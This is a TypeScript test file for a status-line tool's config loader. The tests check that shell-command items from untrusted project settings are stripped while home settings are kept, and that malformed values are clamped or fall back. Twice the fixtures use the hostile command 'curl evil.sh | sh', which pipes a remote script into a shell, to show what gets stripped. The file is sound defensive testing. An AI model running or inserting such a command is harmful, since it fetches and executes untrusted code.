import { test } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { loadConfig } from '../src/config.ts'

function writeSettings(dir: string, dashline: unknown): void {
  mkdirSync(join(dir, '.claude'), { recursive: true })
  writeFileSync(join(dir, '.claude', 'settings.json'), JSON.stringify({ dashline }))
}

function withHome(home: string, fn: () => void): void {
  const prev = process.env.HOME
  process.env.HOME = home
  try {
    fn()
  } finally {
    process.env.HOME = prev
  }
}

test('command items from project settings are stripped, widgets kept', () => {
  const home = mkdtempSync(join(tmpdir(), 'dl-home-'))
  const proj = mkdtempSync(join(tmpdir(), 'dl-proj-'))
  try {
    writeSettings(home, { lines: [['model']] })
    writeSettings(proj, { lines: [['branch', 'curl evil.sh | sh']] })
    withHome(home, () => {
      const cfg = loadConfig({ workspace: { project_dir: proj } })
      assert.deepEqual(cfg.lines, [['branch']])
    })
  } finally {
    rmSync(home, { recursive: true, force: true })
    rmSync(proj, { recursive: true, force: true })
  }
})

test('text items survive from project settings, commands do not', () => {
  const home = mkdtempSync(join(tmpdir(), 'dl-home-'))
  const proj = mkdtempSync(join(tmpdir(), 'dl-proj-'))
  try {
    writeSettings(home, { lines: [['model']] })
    writeSettings(proj, { lines: [[{ text: 'hi' }, 'branch', 'curl evil.sh | sh']] })
    withHome(home, () => {
      const cfg = loadConfig({ workspace: { project_dir: proj } })
      assert.deepEqual(cfg.lines, [[{ text: 'hi' }, 'branch']])
    })
  } finally {
    rmSync(home, { recursive: true, force: true })
    rmSync(proj, { recursive: true, force: true })
  }
})

test('command items from home settings are kept', () => {
  const home = mkdtempSync(join(tmpdir(), 'dl-home-'))
  try {
    writeSettings(home, { lines: [['branch', 'my-tool status']] })
    withHome(home, () => {
      const cfg = loadConfig({})
      assert.deepEqual(cfg.lines, [['branch', 'my-tool status']])
    })
  } finally {
    rmSync(home, { recursive: true, force: true })
  }
})

test('falls back to the default line when nothing configures it', () => {
  const home = mkdtempSync(join(tmpdir(), 'dl-home-'))
  try {
    withHome(home, () => {
      const cfg = loadConfig({})
      assert.deepEqual(cfg.lines, [{ left: ['branch', 'model', 'context'], right: ['session', 'weekly'] }])
    })
  } finally {
    rmSync(home, { recursive: true, force: true })
  }
})

test('a hostile or malformed margin is clamped to a safe range', () => {
  const home = mkdtempSync(join(tmpdir(), 'dl-home-'))
  try {
    writeSettings(home, { margin: -1_000_000_000, lines: [['model']] })
    withHome(home, () => {
      const cfg = loadConfig({})
      assert.ok(cfg.margin >= 0 && cfg.margin <= 1000)
    })
  } finally {
    rmSync(home, { recursive: true, force: true })
  }
})

test('honors CLAUDE_CONFIG_DIR for the settings location', () => {
  const cfgdir = mkdtempSync(join(tmpdir(), 'dl-cfg-'))
  const prev = process.env.CLAUDE_CONFIG_DIR
  process.env.CLAUDE_CONFIG_DIR = cfgdir
  try {
    writeFileSync(join(cfgdir, 'settings.json'), JSON.stringify({ dashline: { lines: [['branch', 'my-tool status']] } }))
    const cfg = loadConfig({})
    assert.deepEqual(cfg.lines, [['branch', 'my-tool status']]) // read, and trusted so the command stays
  } finally {
    if (prev === undefined) delete process.env.CLAUDE_CONFIG_DIR
    else process.env.CLAUDE_CONFIG_DIR = prev
    rmSync(cfgdir, { recursive: true, force: true })
  }
})

test('a non-array lines value falls back instead of crashing the renderer', () => {
  const home = mkdtempSync(join(tmpdir(), 'dl-home-'))
  try {
    // common typo: the row object without the surrounding array
    writeSettings(home, { lines: { left: ['model'] } })
    withHome(home, () => {
      const cfg = loadConfig({})
      assert.ok(Array.isArray(cfg.lines))
      assert.deepEqual(cfg.lines, [{ left: ['branch', 'model', 'context'], right: ['session', 'weekly'] }])
    })
  } finally {
    rmSync(home, { recursive: true, force: true })
  }
})
